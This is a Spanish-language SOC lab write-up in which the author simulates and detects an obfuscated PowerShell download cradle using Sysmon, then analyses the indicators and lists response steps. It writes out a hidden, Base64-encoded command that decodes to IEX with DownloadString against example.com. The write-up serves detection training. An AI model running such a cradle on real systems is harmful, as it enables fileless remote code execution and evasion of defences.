# Caso 002 — Detección de ejecución ofuscada de PowerShell (laboratorio propio)

**Entorno:** Laboratorio casero — Windows 11 + Sysmon (configuración SwiftOnSecurity)
**Rol:** Analista SOC (detección y análisis, extremo a extremo)
**Herramientas:** Sysmon v15.21, Visor de Eventos de Windows
**Tipo de actividad:** Simulación controlada de técnica de malware (fileless / living-off-the-land)

---

## 1. Contexto

A diferencia del Caso 001 (análisis sobre una alerta ya generada en un entorno SOC simulado), este caso fue armado de punta a punta por mí: instalé la herramienta de monitoreo, generé una actividad maliciosa simulada e inofensiva, la detecté en los logs, y la analicé — replicando el flujo completo de un analista SOC desde la instrumentación hasta la respuesta.

**Objetivo del laboratorio:** demostrar la capacidad de detectar y analizar una técnica común de evasión (PowerShell con comando codificado en Base64 que descarga contenido remoto), sin depender de una plataforma de SOC ya armada.

## 2. Preparación del entorno

1. Instalación de **Sysmon** (Sysinternals/Microsoft) con la configuración pública de SwiftOnSecurity, que define un set de reglas de logging estándar de la industria (creación de procesos, conexiones de red, consultas DNS, creación de archivos, cambios de registro, entre otros).
2. Verificación del servicio activo (`Get-Service Sysmon64` → `Running`).
3. Confirmación de que los eventos se generaban correctamente en:
   `Visor de Eventos → Registros de aplicaciones y servicios → Microsoft → Windows → Sysmon → Operational`

## 3. Actividad simulada

Se ejecutó el siguiente comando en una consola de PowerShell sin privilegios elevados, simulando el comportamiento típico de un payload de phishing (por ejemplo, un macro malicioso o script inicial de un adjunto):

```powershell
powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=
```

Al decodificar el Base64, el comando real es:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com')
```

Es decir: **descargar contenido remoto y ejecutarlo directamente en memoria** (técnica de *fileless execution* vía `Invoke-Expression`), sin escribir ningún archivo en disco — lo que dificulta la detección por antivirus tradicionales basados en firmas de archivo.

El comando fue diseñado para fallar de forma segura (`example.com` no expone ese contenido), por lo que no hubo ningún impacto real; el objetivo era únicamente generar la huella de comportamiento que dejaría un ataque real de este tipo.

## 4. Detección y evidencia recolectada

### Evento DNS (Sysmon Event ID 22)
```
Dns query:
UtcTime: 2026-09-09 22:03:45.962
ProcessGuid: {c13aef76-d7bf-6aa1-5063-000000004d00}
ProcessId: 7708
QueryName: example.com
QueryStatus: 9003   (No se pudo resolver el nombre)
```

### Creación del proceso (Sysmon Event ID 1)
```
Process Create:
UtcTime: 2026-09-09 22:03:43.048
ProcessGuid: {c13aef76-d7bf-6aa1-5063-000000004d00}
ProcessId: 7708
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "...\powershell.exe" -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=
User: Hp\genar
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Hashes: SHA256=7600FFE12DA441FE89D035B13801E8E91D064BC544A27B19A5CF49F6AB8B18F5
```

**Correlación clave:** el mismo `ProcessGuid` (`{c13aef76-d7bf-6aa1-5063-000000004d00}`) une ambos eventos — la creación del proceso PowerShell y la consulta DNS que generó a los pocos milisegundos, confirmando que ambos son parte de la misma cadena de ejecución.

## 5. Análisis — por qué esto es sospechoso

| Indicador | Por qué es una señal de alerta |
|---|---|
| `-NoP` (No Profile) | Evita cargar el perfil de PowerShell, típico en ejecución automatizada/no interactiva |
| `-NonI` (Non Interactive) | El proceso no espera interacción del usuario — consistente con ejecución de script, no uso manual |
| `-W Hidden` | Oculta la ventana de la consola — busca pasar desapercibido para el usuario |
| `-Enc` con Base64 | Ofuscación deliberada del comando real, para evadir reglas de detección basadas en texto plano/palabras clave |
| `IEX` + `DownloadString` | Patrón de **fileless malware**: descarga y ejecuta código en memoria sin tocar disco, dificultando la detección por antivirus tradicional |
| IntegrityLevel: Medium | Se ejecutó con privilegios de usuario estándar, no requirió elevación — muestra que el vector no necesita administrador para iniciar la cadena |

Esta combinación de flags es prácticamente una firma de comportamiento malicioso — en un SOC real, cualquiera de estos indicadores por separado podría ser legítimo (un admin puede usar `-Enc` para automatizar tareas), pero la combinación completa (oculto + no interactivo + ofuscado + descarga remota) eleva fuertemente la sospecha.

## 6. Clasificación y respuesta

- **Clasificación:** en este caso, al ser un laboratorio propio, se confirma como **actividad simulada controlada**. En un entorno real, este patrón se clasificaría como **True Positive de alta prioridad**.
- **Acciones que tomaría en un caso real:**
  - Aislar el endpoint de la red para cortar cualquier comunicación con el dominio remoto.
  - Extraer y decodificar el comando completo en Base64 para entender el payload exacto antes de que se ejecute.
  - Bloquear el dominio/IP de destino en el firewall perimetral y DNS.
  - Revisar el historial de PowerShell (`ScriptBlockLogging`, si está habilitado) para ver si hubo comandos adicionales tras la descarga.
  - Buscar el mismo hash de proceso o patrón de comando en otros endpoints (threat hunting).
  - Recomendar habilitar **PowerShell Constrained Language Mode** o políticas de ejecución más restrictivas como medida preventiva.

## 7. Aprendizaje del caso

Este laboratorio permitió entender de punta a punta cómo una técnica de evasión simple (codificación Base64 + ejecución oculta) deja de todos modos una huella clara en los logs del sistema operativo, siempre que exista instrumentación adecuada (Sysmon). También reforzó la importancia de **correlacionar eventos por ProcessGuid** en vez de por ProcessId (que Windows reutiliza y puede llevar a confundir procesos distintos durante la investigación).

## Evidencia visual

![Instalación de Sysmon](./imgs/01-sysmon-install.png)
![Eventos generándose en el Visor de Eventos](./imgs/02-eventos-generandose.png)
![Detalle del evento PowerShell con comando ofuscado](./imgs/03-evento-powershell-detalle.png)

---
*Laboratorio realizado como parte de mi formación práctica en SOC (LetsDefend + Fortinet NSE + Palo Alto SOC Fundamentals). Repositorio de portfolio: https://github.com/GenaroScarpato/SOC-Analyst-portfolio*
